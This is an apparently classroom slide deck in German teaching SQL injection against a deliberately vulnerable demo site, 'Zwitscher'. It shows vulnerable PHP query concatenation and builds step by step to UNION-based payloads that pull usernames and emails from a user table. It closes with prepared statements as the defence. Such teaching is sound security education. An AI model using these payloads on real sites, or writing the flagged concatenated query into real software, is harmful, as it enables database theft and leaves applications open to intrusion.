# SQL injections
## Spaß ~~und Profit~~

---

## SQL

- **S**tructured **Q**uery **L**anguage
- Datenbanksprache
- Häufig genutzt in Web-Anwendungen
- LAMP ( Linux / Apache / MySQL / PHP )

---

## Beispiel-Abfragen

- [SELECT ... FROM ... ](http://www.w3schools.com/sql/sql_select.asp) - Wähle Daten aus Datenbank
- [WHERE](http://www.w3schools.com/sql/sql_where.asp) - Optional: Formulierung von Bedingungen

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia';
```

```sql
SELECT * FROM zwitscher WHERE hashtag = '#trivia' OR hashtag = '#cat';
```

```sql
SELECT user FROM zwitscher WHERE message = 'Things always end well.';
```

---

## Dynamische Abfragen mit PHP

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
$q = mysql_query($sql);
```

[Code ausführen](../zwitscher/)

<br />
<br />

<span style="color:red">Schlechter Code! Nicht nachmachen!</span>

---

## Dynamische Abfragen mit PHP
- Eingabe wird weder überprüft noch abgefangen ("escaped")!
- Was passiert, wenn der Benutzer eine bösartige Eingabe macht?
<br />
<br />
<span style="color:red">Schlechter Code! Nicht nachmachen!</span>

---

## Abfrage 1

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#cat</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
```

[Code ausführen](../zwitscher/?search=%23cat)

---

## Abfrage 2

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#cat' OR hashtag = '#trivia</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
```

[Code ausführen](../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia)

---

## Abfrage 3

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```

<br />
<br />

Eingabe: <span style="color:crimson">#dog' OR '1'='1</span>

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
```

[Code ausführen](../zwitscher/?search=%23dog%27+OR+%271%27%3D%271)

---

## Was haben wir bisher gelernt?

- Offensichtlich: Benutzer können das Suchwort ändern
- Ungewollt: Angreifer können die Abfrage manipulieren

<br />
<br />
<br />

### Ist das gefährlich?

---

# Ja, es ist gefährlich!

- Angreifer kann sich ohne Passwort einloggen
- Angreifer ist nicht auf aktuelle Tabelle beschränkt
- SQL erlaubt das "Aneinanderreihen" zweier Abfrage-Ergebnis-Tabellen mit [UNION](http://www.w3schools.com/sql/sql_union.asp)

---

## Mehr über Zwitscher

- [Zwitscher](../zwitscher/) beinhaltet eine Benutzertabelle
- Wir kennen den Namen der Tabelle und die Namen ihrer Spalten
<br />
<br />
- Name der Tabelle: *user*
- Namen der Spalten: *username*, *mail*, *password*, *age*
<br />
<br />

**Ansatz: Ergänze eine "normale" Abfrage um eine zusätzliche Abfrage der Tabelle *user***

---

## Erster Versuch

```php
$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
```
---
Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user';
```

[Code ausführen](../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user)

<div style="text-align: left"><i>"SQL-Fehler: Es wurde ein Fehler in Ihrer SQL-Syntax gefunden. Suchen Sie in der zu Ihrer MySQL-Server-Version gehörigen Anleitung nach der richtigen Syntax bei der Benutzung von ''' in Zeile 1."</i></div>
<div style="text-align: left"><i>"Syntax-Fehler: Es gibt ein störendes Ausrufezeichen."</i></div>

---

## Zweiter Versuch

Aufgabe: Werde störende Zeichen los, indem du sie auskommentierst

--

## Zweiter Versuch

Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; --</span>

( **Wichtig:** Leerzeichen nach Begrenzungssymbol )

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+)

<div style="text-align: left"><i>"SQL-Fehler: Die benutzten SELECT-Aussagen haben eine unterschiedliche Anzahl von Zeilen."</i></div>

<div style="text-align: left">UNION benötigt die selbe Anzahl von Feldern in beiden Ergebnis-Tabellen.</div>

---

## Und jetzt?

- Wie viele Zeilen gibt es in der ersten Abfrage?
- Keine Ahnung :(

<br />
<br />
<br />

### Kommen wir nicht mehr weiter?   

---

## Was sollen wir tun? Durchprobieren!

- "1" gibt eine Tabelle mit einer Zeile und einem Feld, das '1' enthält, zurück
- "1, 2" gibt eine Tabelle mit einer Zeile und zwei Feldern, die '1' und '2' enthalten, zurück
- "1, 2, 3" gibt eine Tabelle mit ... zurück
- ...
<br />
<br />

**Ansatz: Ausprobieren... Inkrementiere, bis es passt**

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)

:(

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>

```php
$sql = "SELECT * 
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)

:(

--

## Was sollen wir tun? Durchprobieren!

Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
```

[Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)

:)

---

## Dritter Versuch

- Wie viele Zeilen sind in der Ergebnis-Tabelle der ersten Abfrage?
- Drei Zeilen!
- Wähle drei Zeilen: *username*, *mail*, *age*
<br />
<br />

Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; --</span>

```php
$sql = "SELECT *
        FROM zwitscher
        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';
```

[Code ausführen](../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+)

Bingo!

---

## Zusammenfassung

- Verschiedene Tabellen können gelesen werden

- Es gibt Probleme:

    - Tabellennamen sind unbekannt
    - Feldnamen sind unbekannt

<br />
<br />
<br />

### Und jetzt?

---

## Wie man sich Tabellennamen und Feldnamen beschafft

- Metadaten sind hier verfügbar: [information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- Besonders hier:
    - [information_schema.tables](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)
    - [information_schema.columns](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)
<br />
<br />
<br />

### Wie erhalten wir sie? Genau wie vorher!

---

## Wie können wir dieses Problem umgehen?

- Traue niemals Nutzereingaben
- Benutze keine Abfragen, die Strings aneinanderreihen
- Benutze sichere Methoden für die Datenbank-Interaktion
- In PHP: "Prepared statements"

---

## Und jetzt ihr!

Es gibt eine dritte Tabelle in [Zwitscher](../zwitscher/)...
<br />
<br />

**Kannst du sie knacken?**

---

## Links
- [Pentestmonkey Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Exploiting Filtered SQLi](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections)
- [Filter Evasion Cheat Sheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql)
- [Wikipedia (English)](http://en.wikipedia.org/wiki/SQL_injection)
- [Source Code of Zwitscher](../zwitscher/?src)
